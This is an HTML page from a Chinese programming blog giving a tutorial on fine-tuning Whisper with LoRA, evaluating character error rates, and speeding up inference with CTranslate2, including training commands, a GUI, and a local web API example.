@@ -1,0 +1,315 @@
+<!DOCTYPE html>
+<html class="no-js" lang="en">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<title>微调Whisper语音识别模型和加速推理 - 编程爱好者博客</title>
+	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
+	<meta name="description" content="">
+		<meta property="og:title" content="微调Whisper语音识别模型和加速推理" />
+<meta property="og:description" content="前言 OpenAI在开源了号称其英文语音辨识能力已达到人类水准的Whisper项目，且它亦支持其它98种语言的自动语音辨识。Whisper所提供的自动语音识与翻译任务，它们能将各种语言的语音变成文本，也能将这些文本翻译成英文。本项目主要的目的是为了对Whisper模型使用Lora进行微调，目前开源了好几个模型，具体可以在openai查看，下面列出了常用的几个模型。另外项目最后还对语音识别加速推理，使用了CTranslate2加速推理，提示一下，加速推理支持直接使用Whisper原模型转换，并不一定需要微调。
+openai/whisper-tinyopenai/whisper-baseopenai/whisper-smallopenai/whisper-mediumopenai/whisper-largeopenai/whisper-large-v2 源码地址：Whisper-Finetune
+使用环境：
+Anaconda 3Python 3.8Pytorch 1.13.1Ubuntu 18.04GPU A100-PCIE-40GB*1 项目主要程序介绍 aishell.py：制作AIShell训练数据。finetune.py：微调模型。merge_lora.py：合并Whisper和Lora的模型。evaluation.py：评估使用微调后的模型或者Whisper原模型。infer_tfs.py：使用transformers直接调用微调后的模型或者Whisper原模型预测，只适合推理短音频。infer_ct2.py：使用转换为CTranslate2的模型预测，主要参考这个程序用法。infer_gui.py：有GUI界面操作，使用转换为CTranslate2的模型预测。infer_server.py：使用转换为CTranslate2的模型部署到服务器端，提供给客户端调用。 欢迎大家扫码入知识星球讨论，知识星球里面提供项目的模型文件和博主其他相关项目的模型文件，也包括其他一些资源。
+## 模型测试表 原始模型字错率测试表。 使用模型指定语言aishell_testtest_nettest_meeting模型获取whisper-tinyChinese0.318980.404820.75332加入知识星球获取whisper-baseChinese0.221960.304040.50378加入知识星球获取whisper-smallChinese0.138970.184170.31154加入知识星球获取whisper-mediumChinese0.095380.135910.26669加入知识星球获取whisper-largeChinese0.089690.129330.23439加入知识星球获取whisper-large-v2Chinese0.088170.123320.26547加入知识星球获取 微调数据集后字错率测试表。 使用模型指定语言数据集aishell_testtest_nettest_meeting模型获取whisper-tinyChineseAIShell0.130430.44630.57728加入知识星球获取whisper-baseChineseAIShell0.089990.330890.40713加入知识星球获取whisper-smallChineseAIShell0.054520.198310.24229加入知识星球获取whisper-mediumChineseAIShell0.036810.130730.16939加入知识星球获取whisper-large-v2ChineseAIShell0.031390.122010.15776加入知识星球获取whisper-tinyChineseWenetSpeech0.177110.247830.39226加入知识星球获取whisper-large-v2ChineseWenetSpeech0.054430.100870.19087加入知识星球获取 未加速和加速后的推理速度测试表，使用GPU为GTX3090（24G）。 使用模型原生模型实时率(float16)转换CTranslate2加速后实时率(float16)转换CTranslate2加速后实时率(int8_float16)whisper-tiny0.030.060.06whisper-base0.040.060.06whisper-small0.080.080.08whisper-medium0.130.100.10whisper-large-v20.190.120.12 经过处理的数据列表。 数据列表处理方式AiShellWenetSpeech添加标点符号加入知识星球获取加入知识星球获取添加标点符号和时间戳加入知识星球获取加入知识星球获取 重要说明：
+在评估的时候移除模型输出的标点符号，并把繁体中文转成简体中文。aishell_test为AIShell的测试集，test_net和test_meeting为WenetSpeech的测试集。RTF= 所有音频总时间(单位秒) / ASR识别所有音频处理时间(单位秒)。测试速度的音频为dataset/test.wav，时长为8秒。训练数据使用的是带标点符号的数据，字错率高一点。微调AiShell数据不带时间戳，微调WenetSpeech带时间戳。 安装环境 首先安装的是Pytorch的GPU版本，如果已经安装过了，请跳过。 conda install pytorch==1.13.1 torchvision==0.14.1 torchaudio==0.13.1 pytorch-cuda=11.6 -c pytorch -c nvidia 安装所需的依赖库。 python -m pip install -r requirements.txt -i https://pypi.tuna.tsinghua.edu.cn/simple 准备数据 训练的数据集如下，是一个jsonlines的数据列表，也就是每一行都是一个JSON数据，数据格式如下。Whisper是支持有标点符号的，所以训练的数据集中可以带有标点符号。本项目提供了一个制作AIShell数据集的程序aishell.py，执行这个程序可以自动下载并生成如下列格式的训练集和测试集，注意： 这个程序可以通过指定AIShell的压缩文件来跳过下载过程的，如果直接下载会非常慢，可以使用一些如迅雷等下载器下载该数据集，然后通过参数--filepath指定下载的压缩文件路径，如/home/test/data_aishell.tgz。如果不使用时间戳训练，可以不包含sentences部分的数据。
+{ &#34;audio&#34;: { &#34;path&#34;: &#34;dataset/0.wav&#34; }, &#34;sentence&#34;: &#34;近几年，不但我用书给女儿压岁，也劝说亲朋不要给女儿压岁钱，而改送压岁书。&#34;, &#34;sentences&#34;: [ { &#34;start&#34;: 0, &#34;end&#34;: 1.4, &#34;text&#34;: &#34;" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://bchobby.github.io/posts/899b167c143b2227fcdd29387f63afdc/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-10-18T19:08:09+08:00" />
+<meta property="article:modified_time" content="2023-10-18T19:08:09+08:00" />
+
+
+	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+	<link rel="dns-prefetch" href="//fonts.googleapis.com">
+	<link rel="dns-prefetch" href="//fonts.gstatic.com">
+	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">
+
+	<link rel="stylesheet" href="/css/style.css">
+	
+
+	<link rel="shortcut icon" href="/favicon.ico">
+		
+</head>
+<body class="body">
+	<div class="container container--outer">
+		<header class="header">
+	<div class="container header__container">
+		
+	<div class="logo">
+		<a class="logo__link" href="/" title="编程爱好者博客" rel="home">
+			<div class="logo__item logo__text">
+					<div class="logo__title">编程爱好者博客</div>
+					
+				</div>
+		</a>
+	</div>
+		<div class="divider"></div>
+	</div>
+</header>
+		<div class="wrapper flex">
+			<div class="primary">
+			
+<main class="main" role="main">
+	<article class="post">
+		<header class="post__header">
+			<h1 class="post__title">微调Whisper语音识别模型和加速推理</h1>
+			
+		</header>
+		<div class="content post__content clearfix">
+			
+<div id="content_views" class="markdown_views prism-atom-one-light">
+                    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
+                        <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
+                    </svg>
+                    <h3><a id="_0"></a>前言</h3> 
+<p>OpenAI在开源了号称其英文语音辨识能力已达到人类水准的Whisper项目，且它亦支持其它98种语言的自动语音辨识。Whisper所提供的自动语音识与翻译任务，它们能将各种语言的语音变成文本，也能将这些文本翻译成英文。本项目主要的目的是为了对Whisper模型使用Lora进行微调，目前开源了好几个模型，具体可以在<a href="https://huggingface.co/openai" rel="nofollow">openai</a>查看，下面列出了常用的几个模型。另外项目最后还对语音识别加速推理，使用了CTranslate2加速推理，提示一下，加速推理支持直接使用Whisper原模型转换，并不一定需要微调。</p> 
+<ul><li>openai/whisper-tiny</li><li>openai/whisper-base</li><li>openai/whisper-small</li><li>openai/whisper-medium</li><li>openai/whisper-large</li><li>openai/whisper-large-v2</li></ul> 
+<p><strong>源码地址：<a href="https://github.com/yeyupiaoling/Whisper-Finetune">Whisper-Finetune</a></strong></p> 
+<p>使用环境：</p> 
+<ul><li>Anaconda 3</li><li>Python 3.8</li><li>Pytorch 1.13.1</li><li>Ubuntu 18.04</li><li>GPU A100-PCIE-40GB*1</li></ul> 
+<h3><a id="_24"></a>项目主要程序介绍</h3> 
+<ol><li><code>aishell.py</code>：制作AIShell训练数据。</li><li><code>finetune.py</code>：微调模型。</li><li><code>merge_lora.py</code>：合并Whisper和Lora的模型。</li><li><code>evaluation.py</code>：评估使用微调后的模型或者Whisper原模型。</li><li><code>infer_tfs.py</code>：使用transformers直接调用微调后的模型或者Whisper原模型预测，只适合推理短音频。</li><li><code>infer_ct2.py</code>：使用转换为CTranslate2的模型预测，主要参考这个程序用法。</li><li><code>infer_gui.py</code>：有GUI界面操作，使用转换为CTranslate2的模型预测。</li><li><code>infer_server.py</code>：使用转换为CTranslate2的模型部署到服务器端，提供给客户端调用。</li></ol> 
+<p><strong>欢迎大家扫码入知识星球讨论，知识星球里面提供项目的模型文件和博主其他相关项目的模型文件，也包括其他一些资源。</strong></p> 
+<div align="center"> 
+ <img src="https://images2.imgbox.com/48/1f/jAPNeyCY_o.png" alt="知识星球" width="400"> 
+</div> ## 模型测试表 
+<ol><li>原始模型字错率测试表。</li></ol> 
+<table><thead><tr><th align="center">使用模型</th><th align="center">指定语言</th><th align="center">aishell_test</th><th align="center">test_net</th><th align="center">test_meeting</th><th align="center">模型获取</th></tr></thead><tbody><tr><td align="center">whisper-tiny</td><td align="center">Chinese</td><td align="center">0.31898</td><td align="center">0.40482</td><td align="center">0.75332</td><td align="center">加入知识星球获取</td></tr><tr><td align="center">whisper-base</td><td align="center">Chinese</td><td align="center">0.22196</td><td align="center">0.30404</td><td align="center">0.50378</td><td align="center">加入知识星球获取</td></tr><tr><td align="center">whisper-small</td><td align="center">Chinese</td><td align="center">0.13897</td><td align="center">0.18417</td><td align="center">0.31154</td><td align="center">加入知识星球获取</td></tr><tr><td align="center">whisper-medium</td><td align="center">Chinese</td><td align="center">0.09538</td><td align="center">0.13591</td><td align="center">0.26669</td><td align="center">加入知识星球获取</td></tr><tr><td align="center">whisper-large</td><td align="center">Chinese</td><td align="center">0.08969</td><td align="center">0.12933</td><td align="center">0.23439</td><td align="center">加入知识星球获取</td></tr><tr><td align="center">whisper-large-v2</td><td align="center">Chinese</td><td align="center">0.08817</td><td align="center">0.12332</td><td align="center">0.26547</td><td align="center">加入知识星球获取</td></tr></tbody></table> 
+<ol start="2"><li>微调数据集后字错率测试表。</li></ol> 
+<table><thead><tr><th align="center">使用模型</th><th align="center">指定语言</th><th align="center">数据集</th><th align="center">aishell_test</th><th align="center">test_net</th><th align="center">test_meeting</th><th align="center">模型获取</th></tr></thead><tbody><tr><td align="center">whisper-tiny</td><td align="center">Chinese</td><td align="center"><a href="https://openslr.magicdatatech.com/resources/33/" rel="nofollow">AIShell</a></td><td align="center">0.13043</td><td align="center">0.4463</td><td align="center">0.57728</td><td align="center">加入知识星球获取</td></tr><tr><td align="center">whisper-base</td><td align="center">Chinese</td><td align="center"><a href="https://openslr.magicdatatech.com/resources/33/" rel="nofollow">AIShell</a></td><td align="center">0.08999</td><td align="center">0.33089</td><td align="center">0.40713</td><td align="center">加入知识星球获取</td></tr><tr><td align="center">whisper-small</td><td align="center">Chinese</td><td align="center"><a href="https://openslr.magicdatatech.com/resources/33/" rel="nofollow">AIShell</a></td><td align="center">0.05452</td><td align="center">0.19831</td><td align="center">0.24229</td><td align="center">加入知识星球获取</td></tr><tr><td align="center">whisper-medium</td><td align="center">Chinese</td><td align="center"><a href="https://openslr.magicdatatech.com/resources/33/" rel="nofollow">AIShell</a></td><td align="center">0.03681</td><td align="center">0.13073</td><td align="center">0.16939</td><td align="center">加入知识星球获取</td></tr><tr><td align="center">whisper-large-v2</td><td align="center">Chinese</td><td align="center"><a href="https://openslr.magicdatatech.com/resources/33/" rel="nofollow">AIShell</a></td><td align="center">0.03139</td><td align="center">0.12201</td><td align="center">0.15776</td><td align="center">加入知识星球获取</td></tr><tr><td align="center">whisper-tiny</td><td align="center">Chinese</td><td align="center"><a href="./tools/create_wenetspeech_data.py" rel="nofollow">WenetSpeech</a></td><td align="center">0.17711</td><td align="center">0.24783</td><td align="center">0.39226</td><td align="center">加入知识星球获取</td></tr><tr><td align="center">whisper-large-v2</td><td align="center">Chinese</td><td align="center"><a href="./tools/create_wenetspeech_data.py" rel="nofollow">WenetSpeech</a></td><td align="center">0.05443</td><td align="center">0.10087</td><td align="center">0.19087</td><td align="center">加入知识星球获取</td></tr></tbody></table> 
+<ol start="3"><li>未加速和加速后的推理速度测试表，使用GPU为GTX3090（24G）。</li></ol> 
+<table><thead><tr><th align="center">使用模型</th><th align="center">原生模型实时率(float16)</th><th align="center">转换CTranslate2加速后实时率(float16)</th><th align="center">转换CTranslate2加速后实时率(int8_float16)</th></tr></thead><tbody><tr><td align="center">whisper-tiny</td><td align="center">0.03</td><td align="center">0.06</td><td align="center">0.06</td></tr><tr><td align="center">whisper-base</td><td align="center">0.04</td><td align="center">0.06</td><td align="center">0.06</td></tr><tr><td align="center">whisper-small</td><td align="center">0.08</td><td align="center">0.08</td><td align="center">0.08</td></tr><tr><td align="center">whisper-medium</td><td align="center">0.13</td><td align="center">0.10</td><td align="center">0.10</td></tr><tr><td align="center">whisper-large-v2</td><td align="center">0.19</td><td align="center">0.12</td><td align="center">0.12</td></tr></tbody></table> 
+<ol start="4"><li>经过处理的数据列表。</li></ol> 
+<table><thead><tr><th align="center">数据列表处理方式</th><th align="center">AiShell</th><th align="center">WenetSpeech</th></tr></thead><tbody><tr><td align="center">添加标点符号</td><td align="center">加入知识星球获取</td><td align="center">加入知识星球获取</td></tr><tr><td align="center">添加标点符号和时间戳</td><td align="center">加入知识星球获取</td><td align="center">加入知识星球获取</td></tr></tbody></table> 
+<p><strong>重要说明：</strong></p> 
+<ol><li>在评估的时候移除模型输出的标点符号，并把繁体中文转成简体中文。</li><li><code>aishell_test</code>为AIShell的测试集，<code>test_net</code>和<code>test_meeting</code>为WenetSpeech的测试集。</li><li>RTF= 所有音频总时间(单位秒) / ASR识别所有音频处理时间(单位秒)。</li><li>测试速度的音频为<code>dataset/test.wav</code>，时长为8秒。</li><li>训练数据使用的是带标点符号的数据，字错率高一点。</li><li>微调AiShell数据不带时间戳，微调WenetSpeech带时间戳。</li></ol> 
+<h3><a id="_91"></a>安装环境</h3> 
+<ul><li>首先安装的是Pytorch的GPU版本，如果已经安装过了，请跳过。</li></ul> 
+<pre><code class="prism language-shell">conda <span class="token function">install</span> <span class="token assign-left variable">pytorch</span><span class="token operator">==</span><span class="token number">1.13</span>.1 <span class="token assign-left variable">torchvision</span><span class="token operator">==</span><span class="token number">0.14</span>.1 <span class="token assign-left variable">torchaudio</span><span class="token operator">==</span><span class="token number">0.13</span>.1 pytorch-cuda<span class="token operator">=</span><span class="token number">11.6</span> <span class="token parameter variable">-c</span> pytorch <span class="token parameter variable">-c</span> nvidia
+</code></pre> 
+<ul><li>安装所需的依赖库。</li></ul> 
+<pre><code class="prism language-shell">python <span class="token parameter variable">-m</span> pip <span class="token function">install</span> <span class="token parameter variable">-r</span> requirements.txt <span class="token parameter variable">-i</span> https://pypi.tuna.tsinghua.edu.cn/simple
+</code></pre> 
+<h3><a id="_105"></a>准备数据</h3> 
+<p>训练的数据集如下，是一个jsonlines的数据列表，也就是每一行都是一个JSON数据，数据格式如下。Whisper是支持有标点符号的，所以训练的数据集中可以带有标点符号。本项目提供了一个制作AIShell数据集的程序<code>aishell.py</code>，执行这个程序可以自动下载并生成如下列格式的训练集和测试集，<strong>注意：</strong> 这个程序可以通过指定AIShell的压缩文件来跳过下载过程的，如果直接下载会非常慢，可以使用一些如迅雷等下载器下载该数据集，然后通过参数<code>--filepath</code>指定下载的压缩文件路径，如<code>/home/test/data_aishell.tgz</code>。<strong>如果不使用时间戳训练，可以不包含<code>sentences</code>部分的数据</strong>。</p> 
+<pre><code class="prism language-json"><span class="token punctuation">{<!-- --></span>
+   <span class="token string-property property">"audio"</span><span class="token operator">:</span> <span class="token punctuation">{<!-- --></span>
+      <span class="token string-property property">"path"</span><span class="token operator">:</span> <span class="token string">"dataset/0.wav"</span>
+   <span class="token punctuation">}</span><span class="token punctuation">,</span>
+   <span class="token string-property property">"sentence"</span><span class="token operator">:</span> <span class="token string">"近几年，不但我用书给女儿压岁，也劝说亲朋不要给女儿压岁钱，而改送压岁书。"</span><span class="token punctuation">,</span>
+   <span class="token string-property property">"sentences"</span><span class="token operator">:</span> <span class="token punctuation">[</span>
+      <span class="token punctuation">{<!-- --></span>
+         <span class="token string-property property">"start"</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span>
+         <span class="token string-property property">"end"</span><span class="token operator">:</span> <span class="token number">1.4</span><span class="token punctuation">,</span>
+         <span class="token string-property property">"text"</span><span class="token operator">:</span> <span class="token string">"近几年，"</span>
+      <span class="token punctuation">}</span><span class="token punctuation">,</span>
+      <span class="token punctuation">{<!-- --></span>
+         <span class="token string-property property">"start"</span><span class="token operator">:</span> <span class="token number">1.42</span><span class="token punctuation">,</span>
+         <span class="token string-property property">"end"</span><span class="token operator">:</span> <span class="token number">8.4</span><span class="token punctuation">,</span>
+         <span class="token string-property property">"text"</span><span class="token operator">:</span> <span class="token string">"不但我用书给女儿压岁，也劝说亲朋不要给女儿压岁钱，而改送压岁书。"</span>
+      <span class="token punctuation">}</span>
+   <span class="token punctuation">]</span><span class="token punctuation">,</span>
+   <span class="token string-property property">"duration"</span><span class="token operator">:</span> <span class="token number">7.37</span>
+<span class="token punctuation">}</span>
+</code></pre> 
+<h3><a id="_132"></a>微调模型</h3> 
+<p>准备好数据之后，就可以开始微调模型了。训练最重要的两个参数分别是，<code>--base_model</code>指定微调的Whisper模型，这个参数值需要在<a href="https://huggingface.co/openai" rel="nofollow">HuggingFace</a>存在的，这个不需要提前下载，启动训练时可以自动下载，当然也可以提前下载，那么<code>--base_model</code>指定就是路径，同时<code>--local_files_only</code>设置为True。第二个<code>--output_path</code>是是训练时保存的Lora检查点路径，因为我们使用Lora来微调模型。如果想存足够的话，最好将<code>--use_8bit</code>设置为False，这样训练速度快很多。其他更多的参数请查看这个程序。</p> 
+<h4><a id="_136"></a>单卡训练</h4> 
+<p>单卡训练命令如下，Windows系统可以不添加<code>CUDA_VISIBLE_DEVICES</code>参数。</p> 
+<pre><code class="prism language-shell"><span class="token assign-left variable">CUDA_VISIBLE_DEVICES</span><span class="token operator">=</span><span class="token number">0</span> python finetune.py <span class="token parameter variable">--base_model</span><span class="token operator">=</span>openai/whisper-tiny <span class="token parameter variable">--output_dir</span><span class="token operator">=</span>output/
+</code></pre> 
+<h4><a id="_143"></a>多卡训练</h4> 
+<p>多卡训练有两种方法，分别是torchrun和accelerate，开发者可以根据自己的习惯使用对应的方式。</p> 
+<ol><li>使用torchrun启动多卡训练，命令如下，通过<code>--nproc_per_node</code>指定使用的显卡数量。</li></ol> 
+<pre><code class="prism language-shell">torchrun <span class="token parameter variable">--nproc_per_node</span><span class="token operator">=</span><span class="token number">2</span> finetune.py <span class="token parameter variable">--base_model</span><span class="token operator">=</span>openai/whisper-tiny <span class="token parameter variable">--output_dir</span><span class="token operator">=</span>output/
+</code></pre> 
+<ol start="2"><li>使用accelerate启动多卡训练，如果是第一次使用accelerate，要配置训练参数，方式如下。</li></ol> 
+<p>首先配置训练参数，过程是让开发者回答几个问题，基本都是默认就可以，但有几个参数需要看实际情况设置。</p> 
+<pre><code class="prism language-shell">accelerate config
+</code></pre> 
+<p>大概过程就是这样：</p> 
+<pre><code>----------------------------------In which compute environment are you running?
+This machine
+----------------------------------Which type of machine are you using? 
+multi-GPU
+How many different machines will you use (use more than 1 for multi-node training)? [1]:
+Do you wish to optimize your script with torch dynamo?[yes/NO]:
+Do you want to use DeepSpeed? [yes/NO]:
+Do you want to use FullyShardedDataParallel? [yes/NO]:
+Do you want to use Megatron-LM ? [yes/NO]: 
+How many GPU(s) should be used for distributed training? [1]:2
+What GPU(s) (by id) should be used for training on this machine as a comma-seperated list? [all]:
+----------------------------------Do you wish to use FP16 or BF16 (mixed precision)?
+fp16 
+</code></pre> 
+<p>配置完成之后，可以使用以下命令查看配置。</p> 
+<pre><code class="prism language-shell">accelerate <span class="token function">env</span>
+</code></pre> 
+<p>开始训练命令如下。</p> 
+<pre><code class="prism language-shell">accelerate launch finetune.py <span class="token parameter variable">--base_model</span><span class="token operator">=</span>openai/whisper-tiny <span class="token parameter variable">--output_dir</span><span class="token operator">=</span>output/
+</code></pre> 
+<p>输出日志如下：</p> 
+<pre><code class="prism language-shell"><span class="token punctuation">{<!-- --></span><span class="token string">'loss'</span><span class="token builtin class-name">:</span> <span class="token number">0.9098</span>, <span class="token string">'learning_rate'</span><span class="token builtin class-name">:</span> <span class="token number">0.000999046843662503</span>, <span class="token string">'epoch'</span><span class="token builtin class-name">:</span> <span class="token number">0.01</span><span class="token punctuation">}</span>                                                     
+<span class="token punctuation">{<!-- --></span><span class="token string">'loss'</span><span class="token builtin class-name">:</span> <span class="token number">0.5898</span>, <span class="token string">'learning_rate'</span><span class="token builtin class-name">:</span> <span class="token number">0.0009970611012927184</span>, <span class="token string">'epoch'</span><span class="token builtin class-name">:</span> <span class="token number">0.01</span><span class="token punctuation">}</span>                                                    
+<span class="token punctuation">{<!-- --></span><span class="token string">'loss'</span><span class="token builtin class-name">:</span> <span class="token number">0.5583</span>, <span class="token string">'learning_rate'</span><span class="token builtin class-name">:</span> <span class="token number">0.0009950753589229333</span>, <span class="token string">'epoch'</span><span class="token builtin class-name">:</span> <span class="token number">0.02</span><span class="token punctuation">}</span>                                                  
+<span class="token punctuation">{<!-- --></span><span class="token string">'loss'</span><span class="token builtin class-name">:</span> <span class="token number">0.5469</span>, <span class="token string">'learning_rate'</span><span class="token builtin class-name">:</span> <span class="token number">0.0009930896165531485</span>, <span class="token string">'epoch'</span><span class="token builtin class-name">:</span> <span class="token number">0.02</span><span class="token punctuation">}</span>                                          
+<span class="token punctuation">{<!-- --></span><span class="token string">'loss'</span><span class="token builtin class-name">:</span> <span class="token number">0.5959</span>, <span class="token string">'learning_rate'</span><span class="token builtin class-name">:</span> <span class="token number">0.0009911038741833634</span>, <span class="token string">'epoch'</span><span class="token builtin class-name">:</span> <span class="token number">0.03</span><span class="token punctuation">}</span>
+</code></pre> 
+<h3><a id="_196"></a>合并模型</h3> 
+<p>微调完成之后会有两个模型，第一个是Whisper基础模型，第二个是Lora模型，需要把这两个模型合并之后才能之后的操作。这个程序只需要传递两个参数，<code>--lora_model</code>指定的是训练结束后保存的Lora模型路径，注意如何不是最后的<code>checkpoint-final</code>后面还有<code>adapter_model</code>文件夹，第二个<code>--output_dir</code>是合并后模型的保存目录。</p> 
+<pre><code class="prism language-shell">python merge_lora.py <span class="token parameter variable">--lora_model</span><span class="token operator">=</span>output/checkpoint-final <span class="token parameter variable">--output_dir</span><span class="token operator">=</span>models/
+</code></pre> 
+<h3><a id="_203"></a>评估模型</h3> 
+<p>执行以下程序进行评估模型，最重要的两个参数分别是。第一个<code>--model_path</code>指定的是合并后的模型路径，同时也支持直接使用Whisper原模型，例如直接指定<code>openai/whisper-large-v2</code>，第二个是<code>--metric</code>指定的是评估方法，例如有字错率<code>cer</code>和词错率<code>wer</code>。<strong>提示：</strong> 没有微调的模型，可能输出带有标点符号，影响准确率。其他更多的参数请查看这个程序。</p> 
+<pre><code class="prism language-shell">python evaluation.py <span class="token parameter variable">--model_path</span><span class="token operator">=</span>models/whisper-tiny-finetune <span class="token parameter variable">--metric</span><span class="token operator">=</span>cer
+</code></pre> 
+<h3><a id="_211"></a>预测</h3> 
+<p>执行以下程序进行语音识别，这个使用transformers直接调用微调后的模型或者Whisper原模型预测，只适合推理短音频，长语音还是参考<code>infer_ct2.py</code>的使用方式。第一个<code>--audio_path</code>参数指定的是要预测的音频路径。第二个<code>--model_path</code>指定的是合并后的模型路径，同时也支持直接使用Whisper原模型，例如直接指定<code>openai/whisper-large-v2</code>。其他更多的参数请查看这个程序。</p> 
+<pre><code class="prism language-shell">python infer_tfs.py <span class="token parameter variable">--audio_path</span><span class="token operator">=</span>dataset/test.wav <span class="token parameter variable">--model_path</span><span class="token operator">=</span>models/whisper-tiny-finetune
+</code></pre> 
+<h2><a id="_218"></a>加速预测</h2> 
+<p>众所周知，直接使用Whisper模型推理是比较慢的，所以这里提供了一个加速的方式，主要是使用了CTranslate2进行加速，首先要转换模型，把合并后的模型转换为CTranslate2模型。如下命令，<code>--model</code>参数指定的是合并后的模型路径，同时也支持直接使用Whisper原模型，例如直接指定<code>openai/whisper-large-v2</code>。<code>--output_dir</code>参数指定的是转换后的CTranslate2模型路径，<code>--quantization</code>参数指定的是量化模型大小，不希望量化模型的可以直接去掉这个参数。</p> 
+<pre><code class="prism language-shell">ct2-transformers-converter <span class="token parameter variable">--model</span> models/whisper-tiny-finetune <span class="token parameter variable">--output_dir</span> models/whisper-tiny-ct2 <span class="token parameter variable">--copy_files</span> tokenizer.json <span class="token parameter variable">--quantization</span> float16
+</code></pre> 
+<p>执行以下程序进行加速语音识别，<code>--audio_path</code>参数指定的是要预测的音频路径。<code>--model_path</code>指定的是转换后的CTranslate2模型。其他更多的参数请查看这个程序。</p> 
+<pre><code class="prism language-shell">python infer_ct2.py <span class="token parameter variable">--audio_path</span><span class="token operator">=</span>dataset/test.wav <span class="token parameter variable">--model_path</span><span class="token operator">=</span>models/whisper-tiny-ct2
+</code></pre> 
+<p>输出结果如下：</p> 
+<pre><code class="prism language-shell"><span class="token punctuation">{<!-- --></span>
+    <span class="token string">"language"</span><span class="token builtin class-name">:</span> <span class="token string">"zh"</span>,
+    <span class="token string">"duration"</span><span class="token builtin class-name">:</span> <span class="token number">8.39</span>,
+    <span class="token string">"results"</span><span class="token builtin class-name">:</span> <span class="token punctuation">[</span>
+        <span class="token punctuation">{<!-- --></span>
+            <span class="token string">"start"</span><span class="token builtin class-name">:</span> <span class="token number">0.0</span>,
+            <span class="token string">"end"</span><span class="token builtin class-name">:</span> <span class="token number">8.39</span>,
+            <span class="token string">"text"</span><span class="token builtin class-name">:</span> <span class="token string">"近几年不但我用书给女儿压岁也劝说亲朋友不要给女儿压岁钱而改送压岁书"</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">]</span>,
+    <span class="token string">"text"</span><span class="token builtin class-name">:</span> <span class="token string">"近几年不但我用书给女儿压岁也劝说亲朋友不要给女儿压岁钱而改送压岁书"</span>
+<span class="token punctuation">}</span>
+</code></pre> 
+<h2><a id="GUI_246"></a>GUI界面预测</h2> 
+<p>这里同样是使用了CTranslate2进行加速，转换模型方式看上面文档。<code>--model_path</code>指定的是转换后的CTranslate2模型。其他更多的参数请查看这个程序。</p> 
+<pre><code class="prism language-shell">python infer_gui.py <span class="token parameter variable">--model_path</span><span class="token operator">=</span>models/whisper-tiny-ct2
+</code></pre> 
+<p>启动后界面如下：<br> <img src="https://images2.imgbox.com/ad/12/VxIiMFrh_o.jpg" alt="在这里插入图片描述"></p> 
+<h2><a id="Web_259"></a>Web部署</h2> 
+<p>Web部署同样是使用了CTranslate2进行加速，转换模型方式看上面文档。<code>--host</code>指定服务启动的地址，这里设置为<code>0.0.0.0</code>，即任何地址都可以访问。<code>--port</code>指定使用的端口号。<code>--model_path</code>指定的是转换后的CTranslate2模型。<code>--num_workers</code>指定是使用多少个线程并发推理，这在Web部署上很重要，当有多个并发访问是可以同时推理。其他更多的参数请查看这个程序。</p> 
+<pre><code class="prism language-shell">python infer_server.py <span class="token parameter variable">--host</span><span class="token operator">=</span><span class="token number">0.0</span>.0.0 <span class="token parameter variable">--port</span><span class="token operator">=</span><span class="token number">5000</span> <span class="token parameter variable">--model_path</span><span class="token operator">=</span>models/whisper-tiny-ct2 <span class="token parameter variable">--num_workers</span><span class="token operator">=</span><span class="token number">2</span>
+</code></pre> 
+<h3><a id="_267"></a>接口文档</h3> 
+<p>目前提供两个接口，普通的识别接口<code>/recognition</code>和流式返回结果<code>/recognition_stream</code>，注意这个流式是指流式返回识别结果，同样是上传完整的音频，然后流式返回识别结果，这种方式针对长语音识别体验非常好。他们的文档接口是完全一致的，接口参数如下。</p> 
+<table><thead><tr><th align="center">字段</th><th align="center">是否必须</th><th align="center">类型</th><th align="center">默认值</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">audio</td><td align="center">是</td><td align="center">File</td><td align="center"></td><td align="center">要识别的音频文件</td></tr><tr><td align="center">to_simple</td><td align="center">否</td><td align="center">int</td><td align="center">1</td><td align="center">是否繁体转简体</td></tr><tr><td align="center">remove_pun</td><td align="center">否</td><td align="center">int</td><td align="center">0</td><td align="center">是否移除标点符号</td></tr><tr><td align="center">task</td><td align="center">否</td><td align="center">String</td><td align="center">transcribe</td><td align="center">识别任务类型，支持transcribe和translate</td></tr></tbody></table> 
+<p>为了方便理解，这里提供了调用Web接口的Python代码，下面的是<code>/recognition</code>的调用方式。</p> 
+<pre><code class="prism language-python"><span class="token keyword">import</span> requests
+
+response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span><span class="token string">"http://127.0.0.1:5000/recognition"</span><span class="token punctuation">,</span> 
+                         files<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token string">"audio"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">"test.wav"</span><span class="token punctuation">,</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"dataset/test.wav"</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'audio/wav'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
+                         json<span class="token operator">=</span><span class="token punctuation">{<!-- --></span><span class="token string">"to_simple"</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"remove_pun"</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"task"</span><span class="token punctuation">:</span> <span class="token string">"transcribe"</span><span class="token punctuation">}</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">20</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
+</code></pre> 
